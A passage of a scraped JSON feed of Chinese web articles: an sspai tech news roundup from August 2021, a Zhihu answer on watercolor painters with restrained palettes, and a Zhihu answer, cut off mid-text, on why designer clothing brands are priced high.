target=\"_blank\">多一点耐心，为长辈打造更好用的智能手机</a></li>\n<li><a href=\"https://sspai.com/post/60903\" target=\"_blank\">撕掉刻板标签，给长辈挑的手机也可以很多样</a></li>\n<li><a href=\"https://sspai.com/post/64770\" target=\"_blank\">过年回不了家，各大 APP 适老化大比拼</a></li>\n<li><a href=\"http://www.gov.cn/zhengce/content/2020-11/24/content_5563804.htm\" target=\"_blank\">国务院办公厅印发关于切实解决老年人运用智能技术困难实施方案的通知</a></li>\n</ul>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68127"},{"title":"派早报：2020 年东京奥运会正式闭幕、微信回应「青少年模式」被起诉等","date":"2021-08-09 00:51:10","description":"\n<h2>你可能错过的新鲜事</h2>\n<h3>2020 年东京奥运会正式闭幕</h3>\n<p>2020 年东京奥运会于 2021 年 8 月 8 日晚间正式闭幕，本次奥运会中国体育代表团共收获 88 枚奖牌，其中包括 38 枚金牌、32枚银牌、18枚铜牌，位列金牌榜和奖牌榜第二位，这也追平了此前中国代表团海外参加奥运会的最佳战绩。本届奥运会中国体育代表团在部分项目上也获得了重大突破，并打破多项亚洲纪录和赛会纪录。<a href=\"https://olympics.com/tokyo-2020/zh/\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c480n2tb34tcditlghvg.png\"></figure><h3>微信回应「青少年模式」被起诉事宜</h3>\n<p>微信在 8 月 6 日通过微博正式回应北京市海淀区检察院针对其产品「青少年模式」提起的公益诉讼问题，表示将认真自检自查微信青少年模式的功能，且虚心接受用户建议以及诚恳应对民事公益诉讼。目前，微信青少年功能开启后，家长能够设置视频号、公众号、小程序等功能的开放范围，且支持展示视频号青少年专属内容池，限制青少年用户发起直播以及使用直播打赏，关闭小游戏、Q币充值、信用卡等功能，未来微信还会加强完善，共同保护青少年的健康上网生活。<a href=\"https://weibo.com/1930378853/KsfQjh2jO?type=comment\" target=\"_blank\">来源</a></p>\n<h3>小米 11 系列针对 Wi-Fi 问题推出维修方案</h3>\n<p>8 月 6 日，小米中国区服务发布官方声明，针对部分小米 11 及其系列产品出现的特殊 Wi-Fi 问题提出了明确对策。出现此类现象的用户，售后检测后支持换新处理；更换新机后如出现其它质量问题，仍支持 7 天故障退货、15 天换货、一年保修，同时赠送半年延保服务。若换机后再次出现 Wi-Fi 问题的用户，可以进行退机或再次换机；对于未出现此类问题的用户，存在顾虑的，可申请赠送半年延保服务。<a href=\"https://weibo.com/5375169576/Ksdf3iCyq?type=comment#_rnd1628432004983\" target=\"_blank\">来源</a></p>\n<h3>微博「明星势力榜」正式下线</h3>\n<p>微博于 8 月 6 日发布公告，宣布于 2014 年上线的「明星势力榜」正式下线。由于最近一年出现了明星粉丝群体非理性的应援、刷榜现象日益严重，对原本的评分机制造成影响，原先的榜单不能全面客观地反映明星的社会影响力，并且和健康的互动生态产生偏离。</p>\n<p>下线后的「明星势力榜」将进行多维度的改造升级，探索全新的融合媒体评价、作品评价的综合评价体系，在原来数据基础上引入第三方评分数据，拟从媒体影响力、作品影响力、正能量指数、艺人活跃度、商业价值等维度综合评估明星影响力，打造明星全面影响力榜单。全新的评分机制将遏制粉丝集资、打榜、控评等行为，倡导粉丝理智追星，鼓励明星以作品、公益等内容与粉丝进行良性互动。<a href=\"https://weibo.com/1934183965/KscrZdcc2?type=comment\" target=\"_blank\">来源</a></p>\n<h3>特斯拉 Cybertruck 电动皮卡推迟至 2022 年上市</h3>\n<p>8 月 7 日，特斯拉方面已证实，由于制造工艺改善的原因，导致 Cybertruck 电动皮卡由原定计划的 2021 年年底上市变为 2022 年上市。<a href=\"https://electrek.co/2021/08/07/tesla-confirms-cybertruck-electric-pickup-delay-2022/\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c480n35b34tcdd5rnog0.png\"></figure><h3>滴滴出行辟谣数据让渡传闻</h3>\n<p>8 月 6 日，滴滴出行官方发布微博，明确指出近期有关「滴滴将数据权让渡第三方、引入大股东以及退市」等市场传闻均为不实信息。 截止目前，国家七部门联合审查暂未给出明确结果。<a href=\"https://weibo.com/2838754010/KsfVXrxyx?type=comment\" target=\"_blank\">来源</a></p>\n<h2>看看就行的小道消息</h2>\n<ul><li>小米手机通过其微博正式宣布将推出小米平板 5，并在 8 月 10 日正式发布。从目前官方公布的海报来看，小米平板 5 采用金属中框 + 双面玻璃设计，并且突出展示了手写笔功能。此前有消息称该机将搭载高通骁龙 870 处理器、10.95 英寸 LCD 屏幕，分辨率高达 2560x1600，刷新率达 120Hz，触控采样率达 240hz，支持 4096 级的触控和主动笔技术等。来源 (<a href=\"https://weibo.com/2913709715/KskjTDH2b\" target=\"_blank\">1</a>, <a href=\"https://www.ithome.com/0/567/603.htm\" target=\"_blank\">2</a>)</li></ul>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/09/49cf3cc3e97def145106badb3a01a7f1.png\"></figure><h2>少数派的近期动态</h2>\n<p><strong>📰 内容动态</strong></p>\n<ul>\n<li>🚗 由少数派数字工具组联合非旭和老麦制作的《特别少数派·中国西部游自驾指南》现已 <a href=\"http://west.sspai.com/\" target=\"_blank\">上线</a>。</li>\n<li>🌟 少数派会员通讯《<a href=\"https://sspai.com/prime/precog\" target=\"_blank\">职场生存手册</a>》已经上线，带你关注职场的生存法则与自我保护议题。</li>\n<li>📕 由少数派编辑部联合优秀作者出版的实体书《数字时代的效率手册》已经印刷完毕，即将上线各大电商平台，少数派预购会员将获赠该书。</li>\n<li>📷️ 聊聊你最爱的那枚镜头，去 <a href=\"https://sspai.com/bullet/1627633392\" target=\"_blank\">一派</a> 和大家交流一下摄影心得吧。</li>\n</ul>\n<p><strong>💰 折扣促销</strong></p>\n<ul>\n<li>💿 Microsoft 365 <a href=\"https://item.taobao.com/item.htm?id=638827544500\" target=\"_blank\">限时促销</a>，下单再送定制鼠标垫，活动即将结束。</li>\n<li>⚙️ 工具升值包、付费栏目限时 <a href=\"https://sspai.com/post/67817\" target=\"_blank\">特惠加上新</a>，开启你的暑假充电计划。</li>\n<li>📺 <a href=\"https://sspai.com/item/4\" target=\"_blank\">Downie 工具升值包</a> 上线，限时特惠进行中。</li>\n</ul>\n<h2>你可能错过的文章</h2>\n<ul>\n<li><a href=\"https://sspai.com/post/68122\" target=\"_blank\">2000 块钱，在广州租下并鼓捣一个可以装进梦想的家</a></li>\n<li><a href=\"https://sspai.com/post/68092\" target=\"_blank\">国物馆 | 国产冠脉支架 C 面观</a></li>\n<li><a href=\"https://sspai.com/post/68067\" target=\"_blank\">开学季 | 初来南方的你，可能需要这份宿舍生存指南</a></li>\n<li><a href=\"https://sspai.com/post/68040\" target=\"_blank\">HTTPS 是如何保护你的安全的</a></li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68173"},{"title":"有哪些色彩简单却又令人惊艳的画师？","date":"2021-08-08 23:06:51","description":"<div>\n<div>\n<div>\n<img src=\"https://pic3.zhimg.com/v2-dad61e25d1df1ff887178b98f766504b_l.jpg?source=8673f162\"><span>Scotty，</span><span>我总能找到些被忽视的珍珠</span>\n<a href=\"https://www.zhihu.com/question/355628920/answer/2026979390\" hidden>阅读原文</a>\n</div>\n<div>\n<p><strong>0.写在最前</strong></p>\n<p>其实在我看来，色彩从来就没有简单和复杂之分，当你站在一个创作者的角度去欣赏时，你会发现其实每一笔的用色都经过了考量，而这种介于色彩之间的考量是平等的，没有说什么颜色用起来很简单，什么颜色用起来很复杂，所以说当我站在一个以“简单”为标准去衡量的选择后，我有点不适应，我不太明白简单具体指什么?</p>\n<p>调色简单？不要使用太多高级灰和饱和度低的颜色？</p>\n<p>配色简单？不要使用过多的颜色显得花里胡哨？</p>\n<p>用色简单？以黑白作品为主体，用一点点颜色去点缀一下就行了？</p>\n<p>简单这个词，在我看来不在色彩的领域中，</p>\n<p>所以这篇文章，我的选择是以上述这三种“简单”作为一个相对参考的复合标准所选取的作品，更多的倾向还是选择让人“令人惊艳”的作品；</p>\n<p><strong>1.Mark Adams 的水彩静物和风景画</strong></p>\n<p>Mark Adams（1925 - 2006），美国艺术家、设计师，以其简约克制的水彩作品闻名于世；</p>\n<p>Mark Adams 绝对是最切题的画家之一了，简约的造型，干净的颜色，可每一幅都能让你流连忘返，这里面的内容可一点都不简单，每一幅画在提升画面效果的地方都细节拉满；</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-e57954c568ca1dd6b937036b5302e400_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-e5bf61c0205cf95e08f571d329c07ad9_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-4186cf6bb1f8bf1a8b715bc447ab28c5_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pica.zhimg.com/v2-9f3c347f5a0f450ebcbd7ec9e8fb61b1_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-1cde2d1cb736e63d95d313daea595cae_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-962d510b55b1d0d18ba9c70eacfecedd_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-931017c63d5248ab788893b3ada618e4_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-17ce21dd6db0ad1f09c0ad1fff2960ba_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-788453c1d7d5f48e598877ca8c240eac_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-a1c363056933d17ae8fc5592bb8c215a_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-73f291c2fd1c29281c76cc995389b346_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-3acc17cb0f30def3f4979b71e1ad856f_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-53c5142f97139d684c99fc49c796cf5e_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pica.zhimg.com/v2-9a29dfbfa4c7d4d7444db2913b96e958_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-a28cdd7bb1de2740945d414addc2e10f_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic4.zhimg.com/v2-ce8f5b38c0c97520d0121b711c36878f_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-d543793a43d81ea8c10baada16e2ac33_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>2.英国画家 Charles Villeneuve 的建筑水彩画</strong></p>\n<p>Charles Villeneuve，出生于 1971 年，法国水彩画家、建筑设计师，他的水彩画多以欧洲的城市风光为主，</p>\n<p>Charles Villeneuve 刻意去用水彩营造出一股清冷雾朦的氛围，这种用色反而接近了我们印象中的真实，建筑绘画中对于细节的取舍其实是成败的关键，Charles Villeneuve 这一块的节奏处理感比较好，用色调去做整体的大的光影区分，再用独到的笔触去丰富里面的细节，既完整又不失细节，简单的用色，但画面的确让人眼前一亮；</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-fbe65fdc5ad7be6865a35d8caad3d396_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-15f5cb5e7cada5e590084f94d225df0d_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-690b16d45188fa5563d5a014099a99c0_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-ad7e340500f834c57afe7d8fbb7ef22f_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-86703dba47de7a595e06e0a61e5c9fef_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-34a3fcd804a98e0ccbe109d1a2f2c5d2_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-d2cee5484642980328c58a7ceb98021b_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-28d373ab919720f21b69dc0dddea40bc_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>3.Dansleciel Toutvabien 的风景绘画</strong></p>\n<p>绚烂抽象的艺术自然风光，非常简单又奇妙的色彩搭配，Dansleciel Toutvabien 非常喜欢用圆形的居中构图，也有在画面局部使用边缘线的习惯，在颜色的使用上处理出了一种滤镜般的质感；</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-9b380a829aa12b647dc9d8cbcc6e6b2d_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-0cbd0d4e6c3a5d16ad06db04a923bd91_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pica.zhimg.com/v2-6c36dee0c9c29a30f5c4bc1dfa10e6f8_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-e51d18a47a6fefebd0a9d5303fc63fbc_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-3e4bcacfb0aa90d29506f02458d70921_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-c51923cec287f8d5335e0177150e31c2_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-68be99cd5bb609758c463e036e3fdde4_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>4.塞尔维亚画家 Endre Penovác 的迷幻森林</strong></p>\n<p>Endre Penovác，出生于 1956 年，塞尔维亚水彩画家，这位画家的很多作品都是受到中国的水墨画影响而创作，最著名的是黑猫系列，最后放上一张黑猫给各位看看</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-aa1669dc8a5e5931f3f3eac3f27da3d2_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-023fd309183cf777a8cd45e17d8806bc_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-8413d551c8143c440683fb4492e82737_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-b01c72d00cff709079cdeaed9caf51c1_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-0156f76de02cdb7be737b8f772333642_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-e623944ca68501bae1b40ada31c4cb12_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pica.zhimg.com/v2-c23e707507d9ff95a677dda1d3b9ae78_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic4.zhimg.com/v2-62eedeace5b54c80109282d9b2ab2326_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pica.zhimg.com/v2-e5b4daae3e69cea994c6ba602714d211_720w.jpg?source=8673f162\" alt=\"\"></figure><p>Endre Penovác 的这组猫咪相信很多人都看过了，利用水彩的特征去表现猫咪毛发的质感，在造型上也非常生动，收到很多人的喜爱；</p>\n<hr>\n<p>最近我把我这几年在知乎写的一点关于绘画、艺术的干货做了个汇总，大家有需求的欢迎去看看。</p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/98208948\">Scotty：连点绘面：近年来写的绘画、艺术干货汇总 持续更新</a></p>\n<p><strong>以上</strong></p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/355628920\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9739021"},{"title":"为什么服装设计师品牌的价格普遍偏高？","date":"2021-08-08 23:06:45","description":"<div>\n<div>\n<div>\n<img src=\"https://pica.zhimg.com/v2-7bba358ba9cb3fdddc02d3853a68d6be_l.jpg?source=8673f162\"><span>陈一丁Dingslook，</span><span>公众号叫「一只马丁靴」，其他平台@陈一丁Dingslook</span>\n<a href=\"https://www.zhihu.com/question/23052376/answer/2041071772\" hidden>阅读原文</a>\n</div>\n<div>\n<p>之前有读者问到：</p>\n<blockquote>“感觉很多设计师品牌原创性并不高，单品也没有非常惊艳，<strong>凭什么卖那么贵？</strong>”</blockquote>\n<p>这种想法也可以理解，引领时尚的设计师品牌，确实有很大一部分营销成本。</p>\n<p>著名时尚作家 Mark Tungate 就一针见血地说：“当衣服完成制作出厂时，它们还仅是衣服或服装。只有到了营销人员的手中，它们才神奇地变成了时尚。”</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-0c647def04c1bfa767ea4f7aa7a28592_720w.jpg?source=8673f162\" alt=\"\"></figure><p>那对我们这些普通消费者来说，<strong>贵价设计师品牌到底值不值得买？</strong>该用怎样的态度对待这些品牌？今天就来聊聊这个有趣的话题吧~</p>\n<p><strong>====</strong><strong><strong>一、什么是设计师款？</strong></strong></p>\n<p>之前用来举例的图片里，出现过这种分趾鞋（Tabi Shoe），大家可能也注意到了：</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-081b3a6b23a06b0c8d062a5c5a211695_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>▲其实这是 Maison Margiela 品牌的标志性设计 ，早在 1988 年就进入时装界了。</strong></p>\n<p>这种鞋子大部分人可能觉得<strong>有点古怪，</strong>但即便价格在 6k 人民币以上，还是有好多人买。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-35348109f61157181c09afeaa857c2ca_720w.jpg?source=8673f162\" alt=\"\"></figure><p>一面是很多人觉得又贵又丑，一面是少数人觉得个性特别。</p>\n<p>这种差异也体现了设计师款的一个特点：它<strong>不是面向广泛大众的，</strong>而是<strong>更在乎品牌特点和风格，</strong>为风格契合的人群服务。</p>\n<p>现在大家是不是对设计师款多了一点理解呢？</p>\n<p>那下面我们就来更具体地聊一聊，<strong>什么是设计师款，</strong>以及它们<strong>凭什么卖得这么贵。</strong></p>\n<p><strong><strong>▍ 设计师款的定位</strong></strong></p>\n<p>看这张图就一目了然了：</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-ec033798ed4301eeb364df95d9757c87_720w.jpg?source=8673f162\" alt=\"\"></figure><p>大家对奢侈品和大众品牌可能更熟悉：</p>\n<ul>\n<li>\n<strong>奢侈品</strong>主张稀缺珍奇，附加值非常高，价格非常昂贵；</li>\n<li>\n<strong>大众品牌</strong>提倡紧跟潮流，更新换代很快，价格更亲民。</li>\n</ul>\n<p>而设计师品牌的定位，就<strong>介于奢侈品和大众品牌之间，</strong>不像奢侈品牌那么高高在上，又比大众品牌有更多设计心思。</p>\n<p>一些奢侈品的设计师会成立个人品牌，这也<strong>抬高了设计师品牌的档次和价格。</strong></p>\n<p>Céline 前任设计师 Phoebe Philo ，前阵子刚宣布要推出个人同名品牌，在时尚圈里也是个大消息了。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-4aae3edb2225485fcc521a72df8c8b17_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong><strong>▍ 设计师品牌的风格，与本人强烈挂钩</strong></strong></p>\n<p>很多设计师品牌是以<strong>设计师本人的名字</strong>命名的，从这点就可以看出，主理人对品牌的风格和定位<strong>有较大的话语权。</strong></p>\n<p>这样<strong>设计师受到的限制更小，</strong>可以更大胆地发挥创意，表达出自己想要的风格个性。</p>\n<p>我们来看<strong>两个风格完全不一样</strong>的设计师，马上就能 get 到了。</p>\n<p>Jil Sander 说自己是一个纯粹主义的人，她的同名品牌就贯彻了这份纯粹。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-8baac6f792115059efb82ea420297fb2_720w.jpg?source=8673f162\" alt=\"\"></figure><p>这个品牌的衣服通常只用中性的颜色，剪裁精简清晰，着力突出结构和材质本身的美感，<strong>纯粹到只看得见纺织布料&amp;剪裁设计。</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-9a459e86a3522d4fdf59593d10555089_720w.jpg?source=8673f162\" alt=\"\"></figure><p>Simone Rocha 则非常迷恋冲突，她认为所有事物都有一体两面的双重性，很喜欢女性艺术家路易丝·布儒瓦的作品：</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-813e04639a8ec0e01d8199aed0445943_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>▲Rocha 和布儒瓦的织物雕塑。</strong></p>\n<p>她的同名品牌就代表了<strong>暗黑美学的极繁主义，</strong>层次很丰富，经常用薄纱、粗花呢、缎布等材质的碰撞，来表现死亡 - 烂漫这种极端的冲突。</p>\n<figure><img src=\"https://pica.zhimg.com/v2-70096b0e0108a70c518af6e5d3475247_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>▲还会用华丽的刺绣、立体的编织，来表现传统精致的爱尔兰风情。</strong></p>\n<p>是不是感觉她们的个人和作品都好有个性？</p>\n<p>因为风格特别强烈，这时候消费者跟设计师之间，往往就<strong>不只是买卖关系</strong>了，而像是俱乐部关系，<strong>审美相同的人因为爱好聚在一起。</strong></p>\n<p>也就是说，不止认可这个产品，更多是认可这种鲜明的审美。</p>\n<p><strong><strong>▍ 设计师款凭什么这么贵？</strong></strong></p>\n<p>很多人在纳闷，设计师款为什么卖得这么贵啊！</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-4c0c70abc8de15bffe48f86187b8192c_720w.gif?source=8673f162\" alt=\"\"></figure><p>我们先说说<strong>贵的一些合理因素</strong>吧，这个定价也不全是割韭菜，设计师款往往要负担高额的设计成本，对细节也更考究，<strong>本身的制作成本就比一般工厂高很多。</strong></p>\n<p>单从最基本的面料，就可以看出差别了。很多工厂的面料是流水线大批量生产的，而好的<strong>设计师品牌很愿意在面料上耗费心血。</strong></p>\n<p>熟悉 Dries Van Noten 的读者知道，他家的特色是活力满满的色彩、印花和刺绣，这样就<strong>得专门去定制面料。</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-c4cb9437f307177404158e87461c21e4_720w.gif?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-2b1e1cc74e802276003f3af94b7ab8b6_720w.gif?source=8673f162\" alt=\"\"></figure><p><strong>▲ 设计师认为人工比机器更加灵活，可以更细致地表现出想要的细节。</strong></p>\n<p>但在如今商业化的大背景下，大集团出手收购上游供应商，很多<strong>传统的面料厂就不再对外供应了。</strong></p>\n<p>像 CHANEL 就在 2016 年收购了顶级提花面料工厂 Tissages Denis &amp; Fils：</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-931d143b47486c31c6ed152642dc4b11_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>▲这是这家工厂制作的一种提花面料 Jacquard lamé，是不是超精致？</strong></p>\n<p>在这种环境下，<strong>想挑到合适的面料变得越来越难，面料的成本也变得更高。</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-250bdb52ba3b58ea7b05266d4cc191bf_720w.gif?source=8673f162\" alt=\"\"></figure><p><strong>▲DVN 的设计师在采访里提到了这点。</strong></p>\n<p>普通工厂款就没法注入这么多心血和成本了，往往是看到一个面料流行起来，就立刻让版师打版出类似的款式，尽快开始售卖，<strong>不可能为了设计本身去定制面料。</strong></p>\n<p>所以经常会出现“撞花色”的情况，今年买的连衣裙，过几年后还会在大街上看到同样的布料，只不过做成了其他样式。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-3605a39b853adf2479b5ed8479fd1db6_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>▲同一个布料花色，很多店铺都在用。</strong></p>\n<p>除了面料，优秀设计师品牌在<strong>版型和剪裁工艺上把控</strong>也很费心。</p>\n<p>就说最基础的西装，Lemaire 会细致地调整前襟和肩部的比例，让西装的版型更柔和含蓄，同时剪裁干净利落，轮廓鲜明，整件西装看上去<strong>简约又儒雅。</strong></p>\n<figure><img src=\"https://pica.zhimg.com/v2-90de9dcdfc70dfe858d95f6ac5fc8ff6_720w.jpg?source=8673f162\" alt=\"\"></figure><p>而普通的工厂流水线，更关心<strong>控制成本、批量生产，</strong>不会这么耗费心力，有的衣服穿上身会<strong>缺少一种“平衡感”</strong>，比如领口不对称、袖笼扭曲、前后片不对称等等。</p>\n<p>为了帮助大家理解，这里找了个比较典型的例子，整件衣服扭曲感很重，上身也非常不平顺：</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-9b0f7a03f183e54e38d353ddc74894da_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>▲ 这种剪裁就非常差，显得整件外套都极其廉价。</strong></p>\n<p>这样看来，设计师品牌的特点是精益求精，那按这个价格买就一定很值吗？</p>\n<p><strong>====</strong><strong><strong>二、压根不值 or 买到赚到，不妨参考这 3 点</strong></strong></p>\n<p>客观来说，<strong>设计师品牌也存在较高的溢价，</strong>主要来自这 3 个方面。</p>\n<p><strong><strong>▍ 产品本身就不值，标价虚高</strong></strong></p>\n<p>抛开品牌理念，单看衣服质量的话，一些设计师品牌是不值得这个标价的。</p>\n<p>之前我入手了一件 LOW CLASSIC 的风衣，面料符合衣服的风格，版型也很利落显精神，还是蛮有中高端品牌该有的质感。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-0fd4dcd7a4d890676eb5eaf8f5fc6515_720w.jpg?source=8673f162\" alt=\"\"></figure><p>但这件 3800 元的风衣<strong>配了很廉价的塑料扣，</strong>近看直接把整体质感都拉低了。按品质来看，这样的塑料扣不该出现在这种定价的衣服上：</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-b2b8ad8f0b923890a717d3ef3e5b83f0_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>▲ 面料也是普通的棉 + 尼龙混纺，这个价格也并不是在为品质买单。</strong></p>\n<p>另外，还有一些品牌<strong>设计缺少美感，</strong>更多是在卖“设计款”这个标签。</p>\n<p>这些单品动辄 2k+ 起步，但<strong>设计只是一股脑儿堆砌，</strong>足够浮夸张扬却很难称得上好看，除了秀场想不到其他场景能穿。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-e466874ad3db5626e14382244ca0a880_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>▲</strong><strong>有读者就说不是不想支持国货，而是这样浮夸的设计实在下不去手。</strong></p>\n<p>更恶劣的是<strong>抄袭照搬</strong>的，很容易让消费者失去信任。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-874e7494b56aef85a64b8bc2f677c6b8_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>▲</strong><strong>Aone By Wong 2021 春款，就被发现和越南设计师品牌 Lobbster 2020 春夏系列高度雷同。</strong></p>\n<p><strong><br><strong>▍ 擅于营销，抬高身价</strong></strong></p>\n<p>营销应该是大家心知肚明的一点了。时尚品牌不只出售产品本身，也会包装品牌理念等附加值抬高身价。</p>\n<p>很火的 Acne Studios 就是个典型例子，它家大多是质感比较好的基础款，但因为一部分营销的因素，<strong>基础款也卖出了很高的价格。</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-0f928371375431c25a14aa4888a62fb1_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>▲这两件折合成人民币差不多要 5k+/3k+，单论产品本身，确实不值标价。</strong></p>\n<p>创始人 Jonny Johansson 在 1996 年品牌创始初期，就用了非常独特的传播策略。</p>\n<p>他没有像其他品牌一样进行商业推广，而是寄出 100 条牛仔裤，送给斯德哥尔摩的“有创造力的孩子”。这样有爱的宣传方式，就<strong>树立了很正面的形象。</strong></p>\n<p>还自创刊物 Acne Paper，输出自己的设计理念，并且<strong>和不同的领域跨界合作，扩大品牌的影响力。</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-1de30b246d493ef387ed2e72ac65b733_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>▲摄影作家 Robin Muir 刊登在 Acne Paper 上的文章。</strong></p>\n<p>这样新奇的营销策略引起了 Wallpaper 和 French Vogue 的注意，后来越来越多的名人和博主穿起了 Acne，也<strong>吸引了更多的粉丝和消费者。</strong></p>\n<p>除此之外，Acne Studios 的<strong>品牌理念</strong>也打造得很成功。</p>\n<p>他们把基础款打造得比较有质感，同时给了很高的定价，强调瑞典出身的北欧极简清冷气质，给人的印象是<strong>非常讲究品质的小众基础款。</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-9a63dca8505e0fbff38261f337bf5645_720w.jpg?source=8673f162\" alt=\"\"></figure><p>这样的品牌形象和定位，就很能获得中高端收入群体的青睐。他们大多经济能力比较好，又不屑于穿奢侈品，<strong>想要云淡风轻穿出档次。</strong>这样的顾客群体反过来也抬高了品牌的调性。</p>\n<p><strong><strong>▍ 